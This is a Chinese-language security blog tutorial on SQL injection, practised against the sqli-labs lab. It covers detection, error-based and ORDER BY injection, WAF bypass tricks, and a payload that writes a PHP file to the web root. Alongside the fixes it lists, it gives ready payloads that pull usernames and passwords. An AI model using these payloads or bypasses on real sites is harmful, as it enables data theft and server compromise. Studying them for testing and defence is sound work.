SQL注入绕过小实战</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="squar3c"
      src="/images/logo.jpg">
  <p class="site-author-name" itemprop="name">squar3c</p>
  <div class="site-description" itemprop="description">爱就在眼前</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">6</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          链接
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <a href="https://ma3t1n.github.io/" title="https:&#x2F;&#x2F;ma3t1n.github.io&#x2F;" rel="noopener" target="_blank">Ma3t1n</a>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://squar3c.github.com/posts/31899/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/logo.jpg">
      <meta itemprop="name" content="squar3c">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="squar3cの秘密小屋">
      <meta itemprop="description" content="爱就在眼前">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="sql注入 | squar3cの秘密小屋">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          sql注入
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-03-04 22:43:25" itemprop="dateCreated datePublished" datetime="2025-03-04T22:43:25+08:00">2025-03-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-03-20 00:09:24" itemprop="dateModified" datetime="2025-03-20T00:09:24+08:00">2025-03-20</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>29k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>52 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p><strong>漏洞描述</strong></p>
<p>​	Web程序代码中对于用户提交的参数未做过滤，被放到SQL语句中执行，导致参数中的特殊字符打破了 SQL 语句原有逻辑，黑客可以利用该漏洞执行任意 SQL 语句，如查询数据、下载数据、写入 webshell 、执行系统命令以及绕过登录限制等。</p>
<p><strong>漏洞存在条件</strong></p>
<ul>
<li>参数用户可控。</li>
<li>参数带入数据库查询。</li>
</ul>
<p><strong>测试方法</strong></p>
<p>​	在发现有可控参数的地方使用 sqlmap 进行 SQL 注入的检查或者利用，也可以使用其他的 SQL 注入工具，简单点的可以手工测试，利用单引号、and1=1 和 and 1=2 以及字符型注入进行判断。</p>
<p><strong>修复方法</strong></p>
<p>​	在代码层最佳的防御SQL注入的手段是SQL语句的<strong>预编译和绑定变量</strong>。</p>
<p>​	（1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。当前几乎所有的数据库系统都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p>
<p>​	（2）对进入数据库的特殊字符（ ‘ &lt;&gt;&amp;*; 等）进行转义处理，或编码转换。</p>
<p>​	（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为 int 型。</p>
<p>​	（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL 注入语句无法正确执行。 </p>
<p>​	（5）网站每个数据层的编码统一，建议全部使用 UTF-8 编码，上下层编码不一致有可能导致一些过滤模型被绕过。 </p>
<p>​	（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击 对数据库的危害。 </p>
<p>​	（7）避免网站显示 SQL 错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p>
<h3 id="1-1-MySQL相关知识"><a href="#1-1-MySQL相关知识" class="headerlink" title="1.1 MySQL相关知识"></a>1.1 MySQL相关知识</h3><p>​	在<strong>mysql5</strong>版本以后，存在一个数据库为<code>information_schema</code>，在这个库里面，有三个重要的表：<code>columns</code>，<code>tables</code>，<code>SCHEMATA</code>表，在<code>SCHEMATA</code>表中的字段<code>SCHEMA_NAME</code>存放着数据库的信息。<code>tables</code>表中<code>TABLE_SCHEMA</code>和<code>TABLE_NAME</code>分别记录库名和表名。<code>columns</code>存储该用户创建的所有数据库的库名、表名和字段名。</p>
<h4 id="1-1-1-Navicat连接Docker容器内MySQL"><a href="#1-1-1-Navicat连接Docker容器内MySQL" class="headerlink" title="1.1.1 Navicat连接Docker容器内MySQL"></a>1.1.1 Navicat连接Docker容器内MySQL</h4><blockquote>
<p>有这个需求的原因是我太懒了，因为是用的docker开的sqli labs环境，又不想本地再配MySQL环境，因此干脆直接利用了。</p>
</blockquote>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -dt --name sqli-labs -p 8888:80 -p 3307:3306 -e MYSQL_ROOT_PASSWORD=root acgpiano/sqli-labs:latest</span><br></pre></td></tr></tbody></table></figure>

<p>这里需要给MySQL开一个端口映射，我这里给的是<code>3307</code>端口。</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker <span class="built_in">exec</span> -it sqli-labs /bin/bash</span><br><span class="line">$ mysql</span><br></pre></td></tr></tbody></table></figure>

<p>接下来将host修改为<code>%</code>即可。</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> host,<span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">'root'</span>;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></tbody></table></figure>

<style>.wlfhyndzaamn{zoom:50%;}</style><img src="/posts/31899/image-20250306000604769.png" class="wlfhyndzaamn" alt="image-20250306000604769">


<h3 id="1-2-判断是否存在注入"><a href="#1-2-判断是否存在注入" class="headerlink" title="1.2 判断是否存在注入"></a>1.2 判断是否存在注入</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">id<span class="operator">=</span><span class="string">'1'</span><span class="keyword">or</span><span class="string">'1'</span><span class="operator">=</span><span class="string">'1'</span></span><br><span class="line">id<span class="operator">=</span>"1"<span class="keyword">or</span>"1"<span class="operator">=</span>"1"</span><br></pre></td></tr></tbody></table></figure>

<p><strong>有回显</strong>：页面有数据信息返回。</p>
<p><strong>无回显</strong>：输入不同语句，页面无任何变化。</p>
<h3 id="1-3-SQL注释符"><a href="#1-3-SQL注释符" class="headerlink" title="1.3 SQL注释符"></a>1.3 SQL注释符</h3><p><code>#</code>：单行注释，常编码为%23。</p>
<p><code>--空格</code>：单行注释，注意后面有个空格。</p>
<p><code>/**/</code>：多行注释，至少存在两处的注入，也常用来作为空格绕过。</p>
<h3 id="1-4-SQL注入分类"><a href="#1-4-SQL注入分类" class="headerlink" title="1.4 SQL注入分类"></a>1.4 SQL注入分类</h3><p>按注入手法来分：<strong>联合查询、堆叠查询、布尔型、报错型、基于时间延迟</strong>。</p>
<p>按请求类型来分：<strong>GET注入、POST注入、COOKIE注入。</strong></p>
<p>按注入数据类型来分：<strong>int型、string型、like型</strong></p>
<h4 id="1-4-1-报错注入"><a href="#1-4-1-报错注入" class="headerlink" title="1.4.1 报错注入"></a>1.4.1 报错注入</h4><p><strong>XPATH报错注入</strong></p>
<p><code>updatexml（XML_document，XPath_string，new_value）</code>、<code>extractvalue（XML_document，xpath_string）</code>，XPATH的格式形如<code>/test</code>，如果XPATH出现格式错误，则会爆出XPATH语法错误。</p>
<p><strong>floor()函数报错</strong></p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="string">'x'</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x</span><br></pre></td></tr></tbody></table></figure>

<p><code>rand(0)</code>的重复计算是固定的，会随机生成一个[0,1]的小数，<code>rand(0)*2</code>则生成[0,2]的数，<code>floor()</code>函数是向下取整，即最后结果为0或1。我们运行一下看看。</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">8</span>;</span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/31899/image-20250306001213412.png" class="" title="image-20250306001213412">

<p>可以发现这里<code>floor(rand(0)*2)</code>的值是固定的。</p>
<p>接下来说一下<code>group by</code>的原理，<code>group by</code>在执行时，会依次取出查询表中的记录创建一个临时表，<code>group by</code>的对象就是该临时表的主键，如果临时表中出现了该主键，则该值加一，若不存在则<strong>插入</strong>。再来看这个SQL语句。</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="string">'x'</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x</span><br></pre></td></tr></tbody></table></figure>

<p>其键必然为<code>x1</code>或者<code>x0</code>，那么应该只会值增加呀，为什么会报错呢？</p>
<p>这里有个重要特性：当<code>group by</code>和<code>rand()</code>同时使用时，若该临时表中没有主键，则插入前<code>rand()</code>会再执行一次。</p>
<p>那么我们来推断一下，第一次执行，<code>key</code>应该为<code>x0</code>，但是<code>x0</code>不存在，因此<code>rand(0)</code>又计算了一遍，最终第一次执行结果为<code>x1</code>。</p>
<p>第二次执行，这时候<code>key</code>应该为<code>x1</code>，已存在，则值加一即可。</p>
<p>第三次执行，这时候key应该为<code>x0</code>，不存在，<code>rand(0)</code>重新计算一遍，最终应该插入的<code>key</code>为<code>x1</code>，这里就出了问题了，它会直接插入，从而导致主键重复报错，这就是该报错原理。</p>
<img src="/posts/31899/image-20250306003105176.png" class="" title="image-20250306003105176">

<p><strong>优化方案</strong></p>
<p>学习的<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/257881.html">这篇文章</a>，将<code>rand(0)</code>改为了<code>rand(14)</code>，运行一下看看。</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">floor</span>(rand(<span class="number">14</span>)<span class="operator">*</span><span class="number">2</span>) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">8</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">floor</span>(rand(<span class="number">14</span>)<span class="operator">*</span><span class="number">2</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="number">8</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure>

<p>这里只需要两条数据即可报错，但是如果只有一条数据<code>floor()</code>报错注入就不能用了，因为一条数据没办法重复。</p>
<h4 id="1-4-2-ORDER-BY注入"><a href="#1-4-2-ORDER-BY注入" class="headerlink" title="1.4.2 ORDER BY注入"></a>1.4.2 ORDER BY注入</h4><p>主要是不能使用联合注入，还有一些函数区别。</p>
<p><strong>验证方式</strong></p>
<p>升序降序</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">asc</span> # 升序</span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">desc</span> # 降序</span><br></pre></td></tr></tbody></table></figure>

<p><code>rand()</code>函数验证，<code>rand()</code>每次结果随机，因此查询出结果顺序也是随机。</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>rand()</span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> rand()</span><br></pre></td></tr></tbody></table></figure>

<p>延时验证，延时的时间为 (行数 * 1) 秒</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>sleep(<span class="number">1</span>)</span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(<span class="number">1</span>)</span><br></pre></td></tr></tbody></table></figure>

<p><strong>利用方式</strong></p>
<p>报错注入</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> concat(username,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)<span class="operator">%</span><span class="number">23</span> # <span class="built_in">floor</span>()</span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,version())),<span class="number">1</span>) # <span class="keyword">procedure</span> analyse</span><br></pre></td></tr></tbody></table></figure>

<p>布尔盲注和时间盲注使用<code>rand()</code>函数即可</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>rand(<span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">&gt;</span><span class="string">'r'</span>)</span><br><span class="line">?sort<span class="operator">=</span>rand(if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">114</span>,<span class="number">1</span>,sleep(<span class="number">1</span>)))</span><br></pre></td></tr></tbody></table></figure>

<p>写入文件，使用<code>lines terminated by</code>，<code>0x3c3f70687020706870696e666f28293b3f3e</code>是<code>&lt;php phpinfo();&gt;</code>的十六进制编码。</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">into</span> outfile "/var/www/html/less46.php" lines terminated <span class="keyword">by</span> <span class="number">0x3c3f70687020706870696e666f28293b3f3e</span></span><br></pre></td></tr></tbody></table></figure>



<h2 id="2-SQL注入绕过"><a href="#2-SQL注入绕过" class="headerlink" title="2. SQL注入绕过"></a>2. SQL注入绕过</h2><h3 id="2-1-空格字符绕过"><a href="#2-1-空格字符绕过" class="headerlink" title="2.1 空格字符绕过"></a>2.1 空格字符绕过</h3><p><code>%a0</code>：空格</p>
<p><code>%09</code>：TAB键（水平）</p>
<p><code>%0a</code>：新建一行</p>
<p><code>%0c</code>：新的一页</p>
<p><code>%0d</code>：return功能</p>
<p><code>%0b</code>：TAB键（垂直）</p>
<p><code>%00</code>：空字符</p>
<p><code>/**/</code>：替换空格</p>
<p><code>/*!*/</code>：内联注释</p>
<h3 id="2-2-大小写绕过"><a href="#2-2-大小写绕过" class="headerlink" title="2.2 大小写绕过"></a>2.2 大小写绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">UniOn</span> <span class="keyword">SelEcT</span></span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-3-浮点数绕过"><a href="#2-3-浮点数绕过" class="headerlink" title="2.3 浮点数绕过"></a>2.3 浮点数绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8E0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8.0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>;</span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-4-NULL绕过"><a href="#2-4-NULL绕过" class="headerlink" title="2.4 NULL绕过"></a>2.4 NULL绕过</h3><p><code>\N</code>代表NULL</p>
<h3 id="2-5-引号绕过"><a href="#2-5-引号绕过" class="headerlink" title="2.5 引号绕过"></a>2.5 引号绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>"1" #双引号绕过</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="number">0x61646D696E</span>; # 字符串转换为<span class="number">16</span>进制</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(column_name)</span><br><span class="line"><span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> TABLE_NAME<span class="operator">=</span><span class="string">'users'</span> limit <span class="number">1</span>),<span class="number">4</span>; # 如果开启gpc，整数型也可以用十六进制绕过</span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-6-添加库名绕过"><a href="#2-6-添加库名绕过" class="headerlink" title="2.6 添加库名绕过"></a>2.6 添加库名绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> test.users;</span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-7-去重复绕过"><a href="#2-7-去重复绕过" class="headerlink" title="2.7 去重复绕过"></a>2.7 去重复绕过</h3><p>在 mysql 查询可以使用 distinct 去除查询的重复值。可以利用这点突破waf 拦截。</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">distinct</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">distinct</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,version() fromusers;</span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-8-反引号绕过"><a href="#2-8-反引号绕过" class="headerlink" title="2.8 反引号绕过"></a>2.8 反引号绕过</h3><p>字段加反引号可以绕过一些WAF拦截。</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> `test.users`;</span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-9-语言特性绕过"><a href="#2-9-语言特性绕过" class="headerlink" title="2.9 语言特性绕过"></a>2.9 语言特性绕过</h3><p>在 php 语言中 id=1&amp;id=2 后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过一些 waf 的拦截。</p>
<table>
<thead>
<tr>
<th align="center">服务器中间件</th>
<th align="center">解析结果</th>
<th align="center">举例说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">ASP.NET/IIS</td>
<td align="center">所有出现的参数值用逗号连接</td>
<td align="center">color=red,blue</td>
</tr>
<tr>
<td align="center">ASP/IIS</td>
<td align="center">所有出现的参数用逗号连接</td>
<td align="center">color=red,blue</td>
</tr>
<tr>
<td align="center">PHP/Apache</td>
<td align="center">仅最后一次出现参数值</td>
<td align="center">color=blue</td>
</tr>
<tr>
<td align="center">PHP/Zeus</td>
<td align="center">仅最后一次出现参数值</td>
<td align="center">color=blue</td>
</tr>
<tr>
<td align="center">JSP,Servlet/Apache Tomcat</td>
<td align="center">仅第一次出现参数值</td>
<td align="center">color=red</td>
</tr>
<tr>
<td align="center">JSP,Servlet/Oracle Application Server 10g</td>
<td align="center">仅第一次出现参数值</td>
<td align="center">color=red</td>
</tr>
<tr>
<td align="center">JSP,Servlet/Jetty</td>
<td align="center">仅第一次出现参数值</td>
<td align="center">color=red</td>
</tr>
<tr>
<td align="center">IBM Lotus Domino</td>
<td align="center">仅最后一次出现参数值</td>
<td align="center">color=blue</td>
</tr>
<tr>
<td align="center">IBM HTTP Server</td>
<td align="center">仅第一次出现参数值</td>
<td align="center">color=red</td>
</tr>
<tr>
<td align="center">mod_perl,libapreq2/Apache</td>
<td align="center">仅第一次出现参数值</td>
<td align="center">color=red</td>
</tr>
<tr>
<td align="center">Perl CGI/Apache</td>
<td align="center">仅第一次出现参数值</td>
<td align="center">color=red</td>
</tr>
<tr>
<td align="center">mod_wsgi(Python)/Apache</td>
<td align="center">仅第一次出现参数值</td>
<td align="center">color=red</td>
</tr>
<tr>
<td align="center">Python/Zope</td>
<td align="center">转化为List</td>
<td align="center">color=[‘red’,’blue’]</td>
</tr>
</tbody></table>
<h3 id="2-10-逗号绕过"><a href="#2-10-逗号绕过" class="headerlink" title="2.10 逗号绕过"></a>2.10 逗号绕过</h3><p><code>substr</code></p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></tbody></table></figure>

<p><code>mid</code></p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></tbody></table></figure>

<p><code>join</code></p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b</span><br></pre></td></tr></tbody></table></figure>

<p><code>like</code></p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">'%r%'</span>;</span><br></pre></td></tr></tbody></table></figure>

<p><code>offset</code></p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></tbody></table></figure>



<h3 id="2-11-or-and-xor-not绕过"><a href="#2-11-or-and-xor-not绕过" class="headerlink" title="2.11 or and xor not绕过"></a>2.11 or and xor not绕过</h3><p><code>&amp;&amp;</code>等价于and</p>
<p><code>||</code>等价于or</p>
<p><code>!</code>等价于not</p>
<p><code>|</code>等价于xor</p>
<h3 id="2-12-ASCII字符对比绕过"><a href="#2-12-ASCII字符对比绕过" class="headerlink" title="2.12 ASCII字符对比绕过"></a>2.12 ASCII字符对比绕过</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(<span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">114</span>; # <span class="type">char</span>(<span class="number">114</span>)<span class="operator">=</span><span class="string">'r'</span></span><br></pre></td></tr></tbody></table></figure>



